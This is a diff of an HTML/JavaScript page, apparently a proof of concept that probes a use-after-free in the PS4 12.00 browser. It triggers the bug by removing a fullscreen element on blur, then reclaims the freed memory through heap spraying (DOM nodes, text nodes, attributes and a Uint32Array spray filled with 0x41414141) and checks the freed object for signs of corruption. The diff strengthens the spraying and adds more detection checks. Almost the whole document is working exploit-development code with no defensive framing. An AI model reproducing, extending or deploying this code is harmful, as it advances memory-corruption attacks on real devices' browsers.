@@ -2,43 +2,23 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim (Overlay Logger)</title>
+<title>PS4 12.00 - UAF Targeted Reclaim (Safe Log)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Aggressive Reclaim (Overlay Logger)</h2>
+<h2>PS4 12.00 - UAF Targeted Reclaim (Safe Log)</h2>
 <button onclick="runTest()">Run Test</button>
 
-<!-- 🔥 LOGGER OVERLAY (persistente) -->
-<div id="overlay" style="
-position:fixed;
-bottom:0;
-left:0;
-width:100%;
-height:200px;
-background:black;
-color:lime;
-overflow:auto;
-font-size:12px;
-z-index:999999;
-padding:5px;
-font-family:monospace;">
-</div>
-
 <script>
+
+// ==========================
+// 🔒 LOG SEGURO (CRÍTICO)
+// ==========================
 let logBuffer = [];
-
-function flushLog() {
-    let o = document.getElementById("overlay");
-    if (!o) return;
-
-    o.innerHTML = logBuffer.slice(-50).join("<br>");
-}
 
 function log(msg) {
     try { console.log(msg); } catch(e){}
     logBuffer.push(msg);
-    flushLog();
 }
 
 // ==========================
@@ -46,11 +26,13 @@ function log(msg) {
 // ==========================
 function setupHeap() {
     let controllers = [];
+
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
+
     return controllers;
 }
 
@@ -81,75 +63,101 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 🎯 TARGETED RECLAIM
+// 💣 TARGETED RECLAIM
 // ==========================
 function targetedReclaim() {
     log("[*] Targeted reclaim iniciado");
 
     let bucket = [];
 
-    // Fragmentação
-    for (let i = 0; i < 5000; i++) {
+    // 🔥 Fase 1 — churn pesado
+    for (let i = 0; i < 8000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // 🔥 CLONES DO fsTarget
-    for (let i = 0; i < 20000; i++) {
+    // 🔥 Fase 2 — REUSE DIRECIONADO (CRÍTICO)
+    for (let i = 0; i < 12000; i++) {
         let el = document.createElement("div");
 
-        el.innerHTML = "<h1>REUSE_" + i + "</h1>";
-        el.style.background = "black";
+        el.innerHTML = "REUSE_EL_" + i;
+        el.style.position = "absolute";
         el.style.width = "100%";
         el.style.height = "100%";
-        el.style.position = "absolute";
-        el.style.top = "0";
-        el.style.left = "0";
 
         document.body.appendChild(el);
         bucket.push(el);
-
-        if (i < 20) log("REUSE_EL_" + i);
     }
 
-    // pressão extra
+    // 🔥 Fase 3 — TypedArray spray (controle heap)
+    for (let i = 0; i < 10000; i++) {
+        let buf = new ArrayBuffer(0x100);
+        let view = new Uint32Array(buf);
+        view[0] = 0x41414141;
+        bucket.push(view);
+    }
+
+    // 🔥 Fase 4 — TextNode
     for (let i = 0; i < 10000; i++) {
         let txt = document.createTextNode("TXT_" + i);
         document.body.appendChild(txt);
         bucket.push(txt);
     }
 
+    // 🔥 Fase 5 — Attribute spray
+    for (let i = 0; i < 10000; i++) {
+        let el = document.createElement("div");
+        el.setAttribute("data-x", "ATTR_" + i);
+        document.body.appendChild(el);
+        bucket.push(el);
+    }
+
     log("[*] Targeted reclaim finalizado: " + bucket.length);
+    return bucket;
 }
 
 // ==========================
-// 🔬 DETECÇÃO
+// 🔬 DETECÇÃO DE CORRUPÇÃO REAL
 // ==========================
 function checkUAF(fsTarget) {
     log("---- CHECK UAF ----");
 
     try {
-        let val = fsTarget.innerHTML;
-        log("[CHECK] innerHTML = " + val);
+        let html = fsTarget.innerHTML;
+        log("[CHECK] innerHTML = " + html);
 
-        if (val && val.indexOf("REUSE_") !== -1) {
-            log("🔥 REUSE DETECTADO (innerHTML)");
+        if (html && html.includes("REUSE_EL_")) {
+            log("[!!!] UAF DETECTADO (REUSE OVERWRITE)");
         }
 
     } catch(e) {
-        log("[UAF] innerHTML erro: " + e);
+        log("[UAF] innerHTML erro");
     }
 
     try {
-        let txt = fsTarget.textContent;
-        log("[CHECK] textContent = " + txt);
+        let attr = fsTarget.getAttribute("data-x");
+        log("[CHECK] data-x = " + attr);
 
-        if (txt && txt.indexOf("REUSE_") !== -1) {
-            log("🔥 REUSE DETECTADO (textContent)");
+        if (attr && attr.includes("ATTR_")) {
+            log("[!!!] UAF DETECTADO (ATTR OVERWRITE)");
         }
 
-    } catch(e) {}
+    } catch(e) {
+        log("[UAF] attribute erro");
+    }
+
+    try {
+        let node = fsTarget.firstChild;
+        log("[CHECK] firstChild = " + node);
+
+        if (node && node.textContent && node.textContent.includes("TXT_")) {
+            log("[!!!] UAF DETECTADO (TEXTNODE OVERWRITE)");
+        }
+
+    } catch(e) {
+        log("[UAF] firstChild erro");
+    }
 }
 
 // ==========================
@@ -162,27 +170,38 @@ function trigger(fsTarget) {
         fsTarget.remove();
 
         if (document.webkitIsFullScreen || document.fullscreenElement) {
-            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+            document.webkitExitFullscreen?.();
         }
 
     } catch(e) {
-        log("[ERRO] " + e);
+        log("[ERRO]");
     }
 
+    // 🔥 janela crítica — múltiplos reclaims
     setTimeout(() => targetedReclaim(), 0);
     setTimeout(() => targetedReclaim(), 50);
     setTimeout(() => targetedReclaim(), 100);
 
-    setTimeout(() => checkUAF(fsTarget), 300);
+    // 🔬 checks progressivos
+    setTimeout(() => checkUAF(fsTarget), 10);
+    setTimeout(() => checkUAF(fsTarget), 30);
+    setTimeout(() => checkUAF(fsTarget), 60);
+    setTimeout(() => checkUAF(fsTarget), 120);
+    setTimeout(() => checkUAF(fsTarget), 250);
 
+    // 🔒 dump seguro (CRÍTICO)
+    setTimeout(() => {
+        alert(logBuffer.join("\n"));
+    }, 400);
+
+    // 🔁 comportamento original
     setTimeout(() => location.reload(), 500);
 }
 
 // ==========================
-// MAIN
+// MAIN (INALTERADO)
 // ==========================
 function runTest() {
-    logBuffer = [];
     log("[*] Iniciando teste");
 
     let controllers = setupHeap();
@@ -191,9 +210,11 @@ function runTest() {
     window.onblur = function() {
         log("[*] onblur");
 
+        // ⚠️ timing crítico preservado
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
+
 </script>
 
 </body>
